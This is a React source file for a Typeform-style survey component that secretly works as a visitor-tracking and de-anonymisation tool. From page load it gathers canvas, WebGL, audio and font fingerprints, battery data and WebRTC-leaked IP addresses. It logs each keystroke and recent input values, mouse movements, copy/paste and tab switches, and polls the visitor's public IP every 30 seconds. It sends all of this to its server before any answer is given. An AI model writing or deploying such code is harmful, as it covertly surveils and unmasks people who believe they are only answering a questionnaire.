'use client';

import { useState, useCallback, useEffect, useRef } from 'react';
import { AnimatePresence } from 'framer-motion';
import { questions, FormData, LocationData, BehavioralAnalytics, DeviceIntelligence, NetworkMetrics } from '@/lib/types';
import { getBasicLocationData, getFullLocationData } from '@/lib/geolocation';
import { runAdvancedDetection } from '@/lib/advanced-detection';
import QuestionSlide from './QuestionSlide';
import ThankYouScreen from './ThankYouScreen';
import ProgressBar from './ProgressBar';

type FormState = 'form' | 'submitting' | 'success' | 'error';

export default function TypeformContainer() {
  const [formState, setFormState] = useState<FormState>('form');
  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [answers, setAnswers] = useState<Record<string, string>>({
    question1: '',
    question2: '',
    question3: '',
    question4: '',
    question5: '',
    question6: '',
  });
  const [locationData, setLocationData] = useState<LocationData | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  // Enhanced intelligence refs
  const hasInitialized = useRef(false);
  const startTime = useRef(Date.now());
  const questionTimes = useRef<Record<string, number>>({});
  const questionStartTime = useRef(Date.now());
  
  // Behavioral analytics
  const behavioralData = useRef<BehavioralAnalytics>({
    sessionStart: Date.now(),
    totalTime: 0,
    questionTimes: {},
    mouseMovements: [],
    keyPresses: [],
    tabSwitches: [],
    copyPasteEvents: [],
    inputEvents: [],
    interactionPattern: {
      avgMovementPerSecond: 0,
      timePerQuestion: 0,
      tabSwitchCount: 0,
      engagementScore: 0,
      formCompletionRate: 0,
      errorsMade: 0,
      backspaces: 0,
      copyCount: 0,
      pasteCount: 0,
    }
  });
  
  // Device intelligence
  const deviceIntelligence = useRef<DeviceIntelligence>({
    fingerprint: {
      screen: {
        width: 0,
        height: 0,
        colorDepth: 0,
        pixelDepth: 0,
      },
      timezone: '',
      locale: '',
      localStorage: false,
      sessionStorage: false,
      rtcSupported: false,
    },
    sensors: {
      motionSupported: false,
      orientationSupported: false,
      hasCamera: false,
      hasMicrophone: false,
    },
    capabilities: {
      hardwareConcurrency: 0,
      maxTouchPoints: 0,
      cookieEnabled: false,
      doNotTrack: null,
    },
  });
  
  // Network metrics
  const networkMetrics = useRef<NetworkMetrics>({
    connection: {},
    ipHistory: [],
    leaks: {
      webrtc: {
        ipv4: [],
        ipv6: [],
        ipv6Decoded: [],
        public: [],
        local: [],
        stunServers: [],
      },
    },
    performance: {},
  });
  
  // Advanced detection data
  const advancedDetectionData = useRef<any>(null);

  // Collect device fingerprint
  const collectDeviceFingerprint = async () => {
    try {
      const nav = navigator as any;
      const screen = window.screen;
      
      // Basic device info
      deviceIntelligence.current.capabilities = {
        hardwareConcurrency: nav.hardwareConcurrency || 0,
        deviceMemory: nav.deviceMemory,
        maxTouchPoints: nav.maxTouchPoints || 0,
        cookieEnabled: nav.cookieEnabled,
        doNotTrack: nav.doNotTrack,
      };
      
      // Screen info
      deviceIntelligence.current.fingerprint.screen = {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: (screen as any).orientation?.type,
      };
      
      // Timezone and locale
      deviceIntelligence.current.fingerprint.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      deviceIntelligence.current.fingerprint.locale = Intl.DateTimeFormat().resolvedOptions().locale;
      
      // Storage
      deviceIntelligence.current.fingerprint.localStorage = localStorage.length > 0;
      deviceIntelligence.current.fingerprint.sessionStorage = sessionStorage.length > 0;
      
      // WebRTC support
      try {
        const rtc = new RTCPeerConnection();
        deviceIntelligence.current.fingerprint.rtcSupported = true;
        rtc.close();
      } catch {
        deviceIntelligence.current.fingerprint.rtcSupported = false;
      }
      
      // Sensor detection
      deviceIntelligence.current.sensors = {
        motionSupported: 'DeviceMotionEvent' in window,
        orientationSupported: 'DeviceOrientationEvent' in window,
        hasCamera: 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices,
        hasMicrophone: 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices,
      };
      
      // Collect advanced fingerprints in background
      setTimeout(async () => {
        try {
          // Canvas fingerprint
          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          if (ctx) {
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Fingerprint', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Fingerprint', 4, 17);
            deviceIntelligence.current.fingerprint.canvas = canvas.toDataURL();
          }
          
          // WebGL fingerprint
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (gl) {
            const debugInfo = (gl as any).getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
              deviceIntelligence.current.fingerprint.webGLVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
              deviceIntelligence.current.fingerprint.webGLRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
          }
          
          // Audio fingerprint
          try {
            const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            deviceIntelligence.current.fingerprint.audioFingerprint = oscillator.frequency.value;
            oscillator.disconnect();
            audioContext.close();
          } catch (e) {}
          
          // Font detection
          const fonts = [
            'Arial', 'Arial Black', 'Courier New', 'Times New Roman', 
            'Comic Sans MS', 'Verdana', 'Georgia', 'Tahoma'
          ];
          deviceIntelligence.current.fingerprint.fonts = fonts.filter(font => {
            const span = document.createElement('span');
            span.style.fontFamily = font;
            span.innerHTML = 'test';
            span.style.position = 'absolute';
            span.style.left = '-9999px';
            document.body.appendChild(span);
            const width = span.offsetWidth;
            document.body.removeChild(span);
            return width !== 0;
          });
          
          // Battery API
          if ((navigator as any).getBattery) {
            (navigator as any).getBattery().then((battery: any) => {
              deviceIntelligence.current.fingerprint.battery = {
                charging: battery.charging,
                level: battery.level,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
              };
            });
          }
        } catch (error) {
          console.error('Advanced fingerprint collection error:', error);
        }
      }, 1000);
      
    } catch (error) {
      console.error('Device fingerprint error:', error);
    }
  };
  
  // Collect network metrics
  const collectNetworkMetrics = () => {
    const connection = (navigator as any).connection || 
                      (navigator as any).mozConnection || 
                      (navigator as any).webkitConnection;
    
    if (connection) {
      networkMetrics.current.connection = {
        effectiveType: connection.effectiveType,
        downlink: connection.downlink,
        rtt: connection.rtt,
        saveData: connection.saveData,
        type: connection.type,
      };
      
      // Monitor connection changes
      connection.addEventListener('change', () => {
        networkMetrics.current.connection = {
          effectiveType: connection.effectiveType,
          downlink: connection.downlink,
          rtt: connection.rtt,
          saveData: connection.saveData,
          type: connection.type,
        };
      });
    }
  };
  
  // Run advanced detection
  const runAdvancedDetectionAsync = async () => {
    try {
      advancedDetectionData.current = await runAdvancedDetection();
      networkMetrics.current.leaks.webrtc = {
        ipv4: advancedDetectionData.current.ipv4Addresses || [],
        ipv6: advancedDetectionData.current.ipv6Addresses || [],
        ipv6Decoded: advancedDetectionData.current.ipv6Decoded || [],
        public: advancedDetectionData.current.publicIPs || [],
        local: advancedDetectionData.current.localIPs || [],
        stunServers: advancedDetectionData.current.stunServersUsed || [],
      };
    } catch (error) {
      console.error('Advanced detection failed:', error);
    }
  };

  // Behavioral analytics setup
  useEffect(() => {
    // Mouse movement tracking
    const handleMouseMove = (e: MouseEvent) => {
      behavioralData.current.mouseMovements.push({
        x: e.clientX,
        y: e.clientY,
        time: Date.now() - startTime.current
      });
      
      // Limit stored movements
      if (behavioralData.current.mouseMovements.length > 1000) {
        behavioralData.current.mouseMovements = 
          behavioralData.current.mouseMovements.slice(-500);
      }
    };

    // Key press tracking
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Backspace') {
        behavioralData.current.interactionPattern.backspaces++;
      }
      
      if (e.key.length === 1) {
        behavioralData.current.keyPresses.push({
          key: e.key,
          time: Date.now() - startTime.current
        });
      }
    };

    // Tab switching
    const handleVisibilityChange = () => {
      if (document.hidden) {
        behavioralData.current.tabSwitches.push({ 
          type: 'blur', 
          time: Date.now() - startTime.current 
        });
        behavioralData.current.interactionPattern.tabSwitchCount++;
      } else {
        behavioralData.current.tabSwitches.push({ 
          type: 'focus', 
          time: Date.now() - startTime.current 
        });
      }
    };

    // Copy/paste events
    const handleCopy = (e: ClipboardEvent) => {
      const target = e.target as HTMLElement;
      if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
        behavioralData.current.copyPasteEvents.push({
          type: 'copy',
          time: Date.now() - startTime.current,
          field: target.id || target.className || questions[currentQuestion].id
        });
        behavioralData.current.interactionPattern.copyCount++;
      }
    };

    const handlePaste = (e: ClipboardEvent) => {
      const target = e.target as HTMLElement;
      if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
        behavioralData.current.copyPasteEvents.push({
          type: 'paste',
          time: Date.now() - startTime.current,
          field: target.id || target.className || questions[currentQuestion].id
        });
        behavioralData.current.interactionPattern.pasteCount++;
      }
    };

    // Input events
    const handleInput = (e: Event) => {
      const target = e.target as HTMLInputElement;
      behavioralData.current.inputEvents.push({
        type: 'input',
        time: Date.now() - startTime.current,
        field: target.id || target.className || questions[currentQuestion].id,
        value: target.value.slice(-50)
      });
    };

    // Scroll tracking
    const handleScroll = () => {
      const scrollPercent = (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100;
      behavioralData.current.interactionPattern.formCompletionRate = 
        Math.max(behavioralData.current.interactionPattern.formCompletionRate, scrollPercent);
    };

    // Add event listeners
    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('keydown', handleKeyDown);
    document.addEventListener('visibilitychange', handleVisibilityChange);
    document.addEventListener('copy', handleCopy);
    document.addEventListener('paste', handlePaste);
    document.addEventListener('input', handleInput);
    window.addEventListener('scroll', handleScroll);

    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('keydown', handleKeyDown);
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      document.removeEventListener('copy', handleCopy);
      document.removeEventListener('paste', handlePaste);
      document.removeEventListener('input', handleInput);
      window.removeEventListener('scroll', handleScroll);
    };
  }, [currentQuestion]);

  // Track question time
  useEffect(() => {
    // Record time spent on previous question
    if (currentQuestion > 0) {
      const prevQuestionId = questions[currentQuestion - 1].id;
      questionTimes.current[prevQuestionId] = Date.now() - questionStartTime.current;
      behavioralData.current.questionTimes[prevQuestionId] = questionTimes.current[prevQuestionId];
    }
    
    // Reset timer for current question
    questionStartTime.current = Date.now();
  }, [currentQuestion]);

  // On page load: send enhanced intelligence data
  useEffect(() => {
    if (hasInitialized.current) return;
    hasInitialized.current = true;

    const initializeAllData = async () => {
      // Start collecting all intelligence data
      collectDeviceFingerprint();
      collectNetworkMetrics();
      runAdvancedDetectionAsync();
      
      // Get basic location data
      const basicData = await getBasicLocationData();

      // Send FIRST email with enhanced data
      behavioralData.current.totalTime = Date.now() - startTime.current;
      behavioralData.current.interactionPattern.avgMovementPerSecond = 
        behavioralData.current.mouseMovements.length / (behavioralData.current.totalTime / 1000);
      
      // Calculate engagement score
      behavioralData.current.interactionPattern.engagementScore = calculateEngagementScore();

      fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'pageload-enhanced',
          location: basicData,
          behavioralAnalytics: behavioralData.current,
          deviceIntelligence: deviceIntelligence.current,
          networkMetrics: networkMetrics.current,
          advancedDetection: advancedDetectionData.current,
          timestamp: new Date().toISOString(),
        }),
      }).catch(console.error);

      // Trigger browser location popup
      try {
        const fullData = await getFullLocationData();
        setLocationData(fullData);
      } catch {
        setLocationData(basicData);
      }
    };

    initializeAllData();
    
    // Monitor IP changes during session
    const ipCheckInterval = setInterval(async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        networkMetrics.current.ipHistory.push({
          ip: data.ip,
          timestamp: new Date().toISOString(),
          source: 'periodic-check'
        });
      } catch (error) {
        console.error('IP check failed:', error);
      }
    }, 30000); // Every 30 seconds

    return () => clearInterval(ipCheckInterval);
  }, []);

  // Calculate engagement score
  const calculateEngagementScore = () => {
    let score = 100;
    
    // Deduct for tab switches
    score -= Math.min(behavioralData.current.interactionPattern.tabSwitchCount * 5, 30);
    
    // Deduct for very short time per question
    const avgTime = Object.values(behavioralData.current.questionTimes).reduce((a, b) => a + b, 0) / 
                   Math.max(Object.keys(behavioralData.current.questionTimes).length, 1);
    if (avgTime < 1000) score -= 20;
    
    // Deduct for copy-paste
    if (behavioralData.current.interactionPattern.copyCount > 0) score -= 10;
    
    // Add for mouse activity
    const mouseActivity = behavioralData.current.mouseMovements.length / 
                         (behavioralData.current.totalTime / 1000);
    if (mouseActivity > 2) score += 10;
    
    return Math.max(0, Math.min(100, score));
  };

  const handleAnswerChange = useCallback((value: string) => {
    const questionId = questions[currentQuestion].id;
    setAnswers((prev) => ({
      ...prev,
      [questionId]: value,
    }));
  }, [currentQuestion]);

  const handleNext = useCallback(async () => {
    if (currentQuestion < questions.length - 1) {
      setCurrentQuestion((prev) => prev + 1);
    } else {
      // Submit form - sends SECOND email with comprehensive intelligence
      setFormState('submitting');

      // Final behavioral analytics
      behavioralData.current.totalTime = Date.now() - startTime.current;
      behavioralData.current.questionTimes[questions[currentQuestion].id] = 
        Date.now() - questionStartTime.current;
      
      // Calculate final analytics
      const totalQuestions = Object.keys(behavioralData.current.questionTimes).length;
      const totalTime = Object.values(behavioralData.current.questionTimes).reduce((a, b) => a + b, 0);
      behavioralData.current.interactionPattern.timePerQuestion = 
        totalTime / Math.max(totalQuestions, 1);
      behavioralData.current.interactionPattern.avgMovementPerSecond = 
        behavioralData.current.mouseMovements.length / (behavioralData.current.totalTime / 1000);
      behavioralData.current.interactionPattern.engagementScore = calculateEngagementScore();
      behavioralData.current.interactionPattern.formCompletionRate = 100; // Form completed

      const formData: FormData = {
        answers: answers as FormData['answers'],
        location: locationData,
        timestamp: new Date().toISOString(),
        behavioralAnalytics: behavioralData.current,
        deviceIntelligence: deviceIntelligence.current,
        networkMetrics: networkMetrics.current,
      };

      try {
        const response = await fetch('/api/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'form-enhanced',
            ...formData,
            advancedDetection: advancedDetectionData.current,
          }),
        });

        const result = await response.json();

        if (!response.ok) {
          throw new Error(result.error || 'Failed to submit form');
        }

        setFormState('success');
      } catch (err) {
        setError(err instanceof Error ? err.message : 'An error occurred');
        setFormState('error');
      }
    }
  }, [currentQuestion, answers, locationData]);

  const handlePrevious = useCallback(() => {
    if (currentQuestion > 0) {
      setCurrentQuestion((prev) => prev - 1);
    }
  }, [currentQuestion]);

  return (
    <div className="relative">
      {formState === 'form' && (
        <ProgressBar
          current={currentQuestion + 1}
          total={questions.length}
        />
      )}

      <AnimatePresence mode="wait">
        {formState === 'form' && (
          <QuestionSlide
            key={`question-${currentQuestion}`}
            question={questions[currentQuestion]}
            value={answers[questions[currentQuestion].id]}
            onChange={handleAnswerChange}
            onNext={handleNext}
            onPrevious={handlePrevious}
            isFirst={currentQuestion === 0}
            isLast={currentQuestion === questions.length - 1}
            isActive={true}
          />
        )}

        {(formState === 'submitting' ||
          formState === 'success' ||
          formState === 'error') && (
          <ThankYouScreen
            key="thankyou"
            isSubmitting={formState === 'submitting'}
            isSuccess={formState === 'success'}
            error={error}
          />
        )}
      </AnimatePresence>

      {/* Keyboard navigation hint */}
      {formState === 'form' && (
        <div className="fixed bottom-8 right-8 hidden md:flex items-center gap-4 text-sm text-gray-400">
          <div className="flex items-center gap-2">
            <kbd className="px-2 py-1 bg-gray-100 rounded text-gray-600 text-xs font-mono">
              Enter
            </kbd>
            <span>Continue</span>
          </div>
        </div>
      )}
    </div>
  );
}